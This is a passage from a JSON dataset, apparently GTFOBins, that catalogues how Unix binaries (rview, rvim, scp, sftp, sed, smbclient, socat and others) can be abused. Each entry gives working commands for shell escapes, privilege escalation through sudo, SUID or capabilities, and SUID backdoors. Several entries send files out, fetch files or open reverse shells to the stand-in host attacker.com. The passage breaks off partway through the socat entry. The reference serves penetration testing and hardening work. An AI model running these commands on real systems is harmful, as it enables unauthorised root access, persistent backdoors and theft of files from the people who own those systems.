                        "description": "This requires that rview is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that rview is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "sudo install -m =xs $(which rview) .\n\n./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This requires that rview is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    },
                    {
                        "description": "This requires that rview is compiled with Lua support.",
                        "code": "sudo rview -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "This requires that rview is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "cp $(which rview) .\nsudo setcap cap_setuid+ep rview\n\n./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that rview is compiled with Lua support.",
                        "code": "sudo install -m =xs $(which rview) .\n\n./rview -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "rvim",
        "url": "https://gtfobins.github.io/gtfobins/rvim/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This requires that rvim is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    },
                    {
                        "description": "This requires that rvim is compiled with Lua support.",
                        "code": "rvim -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "This requires that rvim is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell. This requires that rvim is compiled with Lua support and that lua-socket is installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
                    }
                ]
            },
            {
                "function": "Non-interactive bind shell",
                "description": "It can bind a non-interactive shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell. This requires that rvim is compiled with Lua support and that lua-socket is installed.",
                        "code": "export LPORT=12345\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "This requires that rvim is compiled with Python support. Prepend :py3 for Python 3. Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "This requires that rvim is compiled with Python support. Prepend :py3 for Python 3. Serve files in the local folder running an HTTP server.",
                        "code": "export LPORT=8888\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "Send a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires that rvim is compiled with Lua support and that lua-socket is installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "This requires that rvim is compiled with Python support. Prepend :py3 for Python 3. Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "Fetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires that rvim is compiled with Lua support and that lua-socket is installed.",
                        "code": "export LPORT=12345\nexport LFILE=file_to_save\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "rvim file_to_write\niDATA\n^[\nw"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "rvim file_to_read"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "This requires that rvim is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that rvim is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "sudo install -m =xs $(which rvim) .\n\n./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This requires that rvim is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    },
                    {
                        "description": "This requires that rvim is compiled with Lua support.",
                        "code": "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "This requires that rvim is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "cp $(which rvim) .\nsudo setcap cap_setuid+ep rvim\n\n./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that rvim is compiled with Lua support.",
                        "code": "sudo install -m =xs $(which rvim) .\n\n./rvim -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "scanmem",
        "url": "https://gtfobins.github.io/gtfobins/scanmem/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "scanmem\nshell /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which scanmem) .\n\n./scanmem\nshell /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo scanmem\nshell /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "sash",
        "url": "https://gtfobins.github.io/gtfobins/sash/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "sash"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which sash) .\n\n./sash"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo sash"
                    }
                ]
            }
        ]
    },
    {
        "name": "screen",
        "url": "https://gtfobins.github.io/gtfobins/screen/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "screen"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This works on screen version 4.06.02. Data is appended to the file and \\n is converted to \\r\\n.",
                        "code": "LFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA"
                    },
                    {
                        "description": "This works on screen version 4.05.00. Data is appended to the file and \\n is converted to \\r\\n.",
                        "code": "LFILE=file_to_write\nscreen -L $LFILE echo DATA"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo screen"
                    }
                ]
            }
        ]
    },
    {
        "name": "scp",
        "url": "https://gtfobins.github.io/gtfobins/scp/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file to a SSH server.",
                        "code": "RPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file from a SSH server.",
                        "code": "RPATH=user@attacker.com:~/file_to_get\nLFILE=file_to_save\nscp $RPATH $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which scp) .\n\nTF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:"
                    }
                ]
            }
        ]
    },
    {
        "name": "script",
        "url": "https://gtfobins.github.io/gtfobins/script/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "script -q /dev/null"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The wrote content is corrupted by debug prints.",
                        "code": "script -q -c 'echo DATA' file_to_write"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo script -q /dev/null"
                    }
                ]
            }
        ]
    },
    {
        "name": "sed",
        "url": "https://gtfobins.github.io/gtfobins/sed/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "GNU version only. Also, this requires bash.",
                        "code": "sed -n '1e exec sh 1>&0' /etc/hosts"
                    },
                    {
                        "description": "GNU version only. The resulting shell is not a proper TTY shell.",
                        "code": "sed e"
                    }
                ]
            },
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "GNU version only.",
                        "code": "sed -n '1e id' /etc/hosts"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsed '' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which sed) .\n\nLFILE=file_to_read\n./sed -e '' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "GNU version only. Also, this requires bash.",
                        "code": "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
                    }
                ]
            }
        ]
    },
    {
        "name": "scrot",
        "url": "https://gtfobins.github.io/gtfobins/scrot/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "scrot -e /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo scrot -e /bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which scrot) .\n\n./scrot -e /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "service",
        "url": "https://gtfobins.github.io/gtfobins/service/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "/usr/sbin/service ../../bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo service ../../bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "setarch",
        "url": "https://gtfobins.github.io/gtfobins/setarch/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "setarch $(arch) /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which setarch) .\n\n./setarch $(arch) /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo setarch $(arch) /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "setlock",
        "url": "https://gtfobins.github.io/gtfobins/setlock/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\nsetlock $TF /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which setlock) .\n\n./setlock - /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo setlock - /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "setfacl",
        "url": "https://gtfobins.github.io/gtfobins/setfacl/",
        "functions": [
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which setfacl) .\n\nLFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "sg",
        "url": "https://gtfobins.github.io/gtfobins/sg/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "Commands can be run if the current user’s group is specified, therefore no additional permissions are needed.",
                        "code": "sg $(id -ng)"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo sg root"
                    }
                ]
            }
        ]
    },
    {
        "name": "sftp",
        "url": "https://gtfobins.github.io/gtfobins/sftp/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "HOST=user@attacker.com\nsftp $HOST\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file to a SSH server.",
                        "code": "RHOST=user@attacker.com\nsftp $RHOST\nput file_to_send file_to_save"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file from a SSH server.",
                        "code": "RHOST=user@attacker.com\nsftp $RHOST\nget file_to_get file_to_save"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "slsh",
        "url": "https://gtfobins.github.io/gtfobins/slsh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "slsh -e 'system(\"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo slsh -e 'system(\"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which slsh) .\n\n./slsh -e 'system(\"/bin/sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "shuf",
        "url": "https://gtfobins.github.io/gtfobins/shuf/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The written file content is corrupted by adding a newline.",
                        "code": "LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\""
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The read file content is corrupted by randomizing the order of NUL terminated strings.",
                        "code": "LFILE=file_to_read\nshuf -z \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "The written file content is corrupted by adding a newline.",
                        "code": "sudo install -m =xs $(which shuf) .\n\nLFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The written file content is corrupted by adding a newline.",
                        "code": "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "snap",
        "url": "https://gtfobins.github.io/gtfobins/snap/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "sub_description": "It runs commands using a specially crafted Snap package. Generate it with fpm and upload it to the target.",
                        "code": "COMMAND=id\ncd $(mktemp -d)\nmkdir -p meta/hooks\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\nchmod +x meta/hooks/install\nfpm -n xxxx -s dir -t snap -a all meta"
                    },
                    {
                        "code": "sudo snap install xxxx_1.0_all.snap --dangerous --devmode"
                    }
                ]
            }
        ]
    },
    {
        "name": "smbclient",
        "url": "https://gtfobins.github.io/gtfobins/smbclient/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "smbclient '\\\\attacker\\share'\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Install Impacket and run sudo smbserver.py share /tmp on the attacker box to collect the file.",
                        "code": "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Install Impacket and run sudo smbserver.py share /tmp on the attacker box to send the file.",
                        "code": "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo smbclient '\\\\attacker\\share'\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "socat",
        "url": "https://gtfobins.github.io/gtfobins/socat/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "The resulting shell is not a proper TTY shell and lacks the prompt.",
                        "code": "socat stdin exec:/bin/sh"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
